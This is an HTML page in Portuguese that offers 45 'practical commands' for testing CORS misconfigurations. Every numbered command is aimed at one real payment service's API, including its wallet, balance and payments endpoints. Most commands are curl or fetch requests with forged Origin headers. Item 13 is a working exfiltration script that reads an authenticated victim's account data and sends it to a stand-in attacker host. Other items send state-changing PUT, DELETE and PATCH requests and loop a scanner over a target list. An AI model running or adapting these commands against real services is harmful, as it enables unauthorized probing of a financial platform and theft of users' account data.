<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>CORS Misconfiguration Testing – Practical Commands</title>
<style>
body{
font-family: Arial, sans-serif;
background:#f4f6f8;
color:#333;
margin:40px;
}
h1,h2{
color:#1a3d7c;
}
code{
background:#eee;
padding:6px;
display:block;
margin:10px 0;
white-space:pre-wrap;
}
.section{
background:white;
padding:20px;
margin-bottom:25px;
border-radius:8px;
box-shadow:0 2px 6px rgba(0,0,0,0.1);
}
</style>
</head>

<body>

<h1>CORS Misconfiguration Testing – Practical Commands</h1>

<div class="section">
<p>
Este guia mostra <b>45 comandos práticos</b> para testar vulnerabilidades de
<b>Cross-Origin Resource Sharing (CORS)</b> em aplicações web.
</p>

<p>
O objetivo é identificar quando um servidor aceita <b>origens arbitrárias</b>
e permite envio de <b>credenciais</b>, possibilitando que um site malicioso
leia dados sensíveis de uma vítima autenticada.
</p>

<h2>Ferramentas usadas</h2>
<ul>
<li>curl</li>
<li>Navegador</li>
<li>JavaScript fetch</li>
<li>PowerShell</li>
<li>Burp Suite</li>
</ul>
</div>

<!-- ========================= -->
<h2>1 — Teste básico de CORS</h2>
<div class="section">
<code>
curl -i https://cash.app \
-H "Origin: https://evil.com"
</code>
<p>Verifica se o servidor reflete qualquer origem.</p>
</div>

<h2>2 — Teste com credenciais</h2>
<div class="section">
<code>
curl -i https://cash.app/api/v1/me \
-H "Origin: https://evil.com" \
-H "Cookie: session=SEUCOOKIE"
</code>
<p>Simula usuário autenticado e verifica se dados podem ser lidos.</p>
</div>

<h2>3 — Teste endpoint API</h2>
<div class="section">
<code>
curl -i https://cash.app/api \
-H "Origin: https://evil.com"
</code>
</div>

<h2>4 — Teste GraphQL</h2>
<div class="section">
<code>
curl -i https://cash.app/graphql \
-H "Origin: https://evil.com"
</code>
</div>

<h2>5 — Origin null</h2>
<div class="section">
<code>
curl -i https://cash.app \
-H "Origin: null"
</code>
</div>

<h2>6 — Subdomínio malicioso</h2>
<div class="section">
<code>
curl -i https://cash.app \
-H "Origin: https://cash.app.evil.com"
</code>
</div>

<h2>7 — Domínio parecido</h2>
<div class="section">
<code>
curl -i https://cash.app \
-H "Origin: https://evilcash.app"
</code>
</div>

<h2>8 — Localhost</h2>
<div class="section">
<code>
curl -i https://cash.app \
-H "Origin: http://localhost"
</code>
</div>

<h2>9 — Múltiplos headers Origin</h2>
<div class="section">
<code>
curl -i https://cash.app \
-H "Origin: https://evil.com" \
-H "Origin: https://attacker.com"
</code>
</div>

<h2>10 — Preflight OPTIONS</h2>
<div class="section">
<code>
curl -i -X OPTIONS https://cash.app/api \
-H "Origin: https://evil.com" \
-H "Access-Control-Request-Method: GET"
</code>
</div>

<h2>11 — POST GraphQL</h2>
<div class="section">
<code>
curl -i -X POST https://cash.app/graphql \
-H "Origin: https://evil.com" \
-H "Content-Type: application/json" \
-d '{"query":"{ viewer { id email } }"}'
</code>
</div>

<h2>12 — Fetch no navegador</h2>
<div class="section">
<code>
fetch("https://cash.app/api/v1/me", {
 credentials: "include"
})
.then(r => r.text())
.then(console.log)
</code>
</div>

<h2>13 — Exfiltração de dados</h2>
<div class="section">
<code>
fetch("https://cash.app/api/v1/me", {
 credentials: "include"
})
.then(r => r.text())
.then(data => {
 fetch("https://evil.com/steal?d=" + btoa(data))
})
</code>
</div>

<h2>14 — Teste PowerShell</h2>
<div class="section">
<code>
$client = New-Object System.Net.Http.HttpClient
$req = New-Object System.Net.Http.HttpRequestMessage
$req.Method = [System.Net.Http.HttpMethod]::Get
$req.RequestUri = "https://cash.app"
$req.Headers.TryAddWithoutValidation("Origin","https://evil.com")

$resp = $client.SendAsync($req).Result
$resp.Headers
</code>
</div>

<h2>15 — Teste em múltiplos endpoints</h2>
<div class="section">
<code>
for path in / /api /graphql /api/v1/me /profile
do
curl -s -I https://cash.app$path -H "Origin: https://evil.com"
done
</code>
</div>

<!-- ========================= -->
<h1>30 Testes adicionais</h1>

<h2>16 — Origin com porta</h2>
<code>
curl -i https://cash.app -H "Origin: https://evil.com:8080"
</code>

<h2>17 — Origin HTTP</h2>
<code>
curl -i https://cash.app -H "Origin: http://evil.com"
</code>

<h2>18 — Subdomínio localhost</h2>
<code>
curl -i https://cash.app -H "Origin: http://test.localhost"
</code>

<h2>19 — Origin IP</h2>
<code>
curl -i https://cash.app -H "Origin: http://127.0.0.1"
</code>

<h2>20 — Origin com encoding</h2>
<code>
curl -i https://cash.app -H "Origin: https://evil.com%00.cash.app"
</code>

<h2>21 — Origin com wildcard</h2>
<code>
curl -i https://cash.app -H "Origin: https://*.evil.com"
</code>

<h2>22 — Origin uppercase</h2>
<code>
curl -i https://cash.app -H "Origin: HTTPS://EVIL.COM"
</code>

<h2>23 — Origin duplicado</h2>
<code>
curl -i https://cash.app \
-H "Origin: https://evil.com" \
-H "origin: https://attacker.com"
</code>

<h2>24 — Origin com espaço</h2>
<code>
curl -i https://cash.app -H "Origin: https://evil.com "
</code>

<h2>25 — Origin com tab</h2>
<code>
curl -i https://cash.app -H $'Origin:\thttps://evil.com'
</code>

<h2>26 — Teste endpoint wallet</h2>
<code>
curl -i https://cash.app/api/wallet -H "Origin: https://evil.com"
</code>

<h2>27 — Teste endpoint balance</h2>
<code>
curl -i https://cash.app/api/balance -H "Origin: https://evil.com"
</code>

<h2>28 — Teste endpoint payments</h2>
<code>
curl -i https://cash.app/api/payments -H "Origin: https://evil.com"
</code>

<h2>29 — Teste endpoint user</h2>
<code>
curl -i https://cash.app/api/user -H "Origin: https://evil.com"
</code>

<h2>30 — Teste endpoint settings</h2>
<code>
curl -i https://cash.app/api/settings -H "Origin: https://evil.com"
</code>

<h2>31 — Header Referer</h2>
<code>
curl -i https://cash.app \
-H "Origin: https://evil.com" \
-H "Referer: https://evil.com"
</code>

<h2>32 — Header X-Forwarded-Host</h2>
<code>
curl -i https://cash.app \
-H "Origin: https://evil.com" \
-H "X-Forwarded-Host: evil.com"
</code>

<h2>33 — Header Host spoof</h2>
<code>
curl -i https://cash.app \
-H "Host: evil.com"
</code>

<h2>34 — Burp Repeater test</h2>
<code>
GET /api/v1/me HTTP/1.1
Host: cash.app
Origin: https://evil.com
</code>

<h2>35 — Teste curl verbose</h2>
<code>
curl -v https://cash.app -H "Origin: https://evil.com"
</code>

<h2>36 — Teste HEAD request</h2>
<code>
curl -I https://cash.app -H "Origin: https://evil.com"
</code>

<h2>37 — Teste PUT</h2>
<code>
curl -X PUT https://cash.app/api \
-H "Origin: https://evil.com"
</code>

<h2>38 — Teste DELETE</h2>
<code>
curl -X DELETE https://cash.app/api \
-H "Origin: https://evil.com"
</code>

<h2>39 — Teste PATCH</h2>
<code>
curl -X PATCH https://cash.app/api \
-H "Origin: https://evil.com"
</code>

<h2>40 — Fetch POST</h2>
<code>
fetch("https://cash.app/api", {
method:"POST",
credentials:"include"
})
</code>

<h2>41 — Fetch GraphQL</h2>
<code>
fetch("https://cash.app/graphql", {
method:"POST",
credentials:"include",
headers:{"Content-Type":"application/json"},
body:JSON.stringify({query:"{viewer{id}}"})
})
</code>

<h2>42 — Fetch com header custom</h2>
<code>
fetch("https://cash.app/api", {
headers:{"X-Test":"evil"}
})
</code>

<h2>43 — Script automático bash</h2>
<code>
for o in evil.com attacker.com test.com
do
curl -I https://cash.app -H "Origin: https://$o"
done
</code>

<h2>44 — Scanner simples</h2>
<code>
while read url
do
curl -I $url -H "Origin: https://evil.com"
done < targets.txt
</code>

<h2>45 — Script NodeJS</h2>
<code>
fetch("https://cash.app", {
headers:{Origin:"https://evil.com"}
}).then(r=>console.log(r.headers))
</code>

<div class="section">
<h2>Como confirmar vulnerabilidade CORS real</h2>

<ul>
<li>Servidor reflete <b>Origin arbitrário</b></li>
<li>Servidor permite <b>Access-Control-Allow-Credentials: true</b></li>
<li>Endpoint retorna <b>dados sensíveis autenticados</b></li>
</ul>

<code>
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
</code>
</div>

<div class="section">
<h2>Referências</h2>

<p>OWASP CORS Guide</p>
<p>https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny</p>

<p>PortSwigger Web Security Academy</p>
<p>https://portswigger.net/web-security/cors</p>

</div>

</body>
</html>
